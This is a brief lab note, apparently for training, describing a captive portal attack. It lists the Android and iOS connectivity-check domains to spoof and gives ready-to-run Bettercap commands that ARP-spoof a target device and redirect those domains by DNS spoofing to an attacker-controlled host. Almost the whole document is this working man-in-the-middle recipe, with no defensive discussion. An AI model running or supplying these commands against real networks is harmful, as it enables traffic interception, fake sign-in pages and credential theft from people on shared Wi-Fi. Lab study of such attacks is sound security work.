# SafeZone Lab: Captive Portal Attack

## 1. Redirect Background Checks
To trigger the Android "Sign-in to Wi-Fi" popup, we spoof the connectivity domains:
- connectivitycheck.gstatic.com (Android)
- captive.apple.com (iOS)

## 2. Bettercap Commands
```bash
sudo bettercap -iface en0
set arp.spoof.targets 192.168.0.X
set dns.spoof.domains connectivitycheck.gstatic.com, captive.apple.com
set dns.spoof.address 192.168.0.2
arp.spoof on
dns.spoof on
```
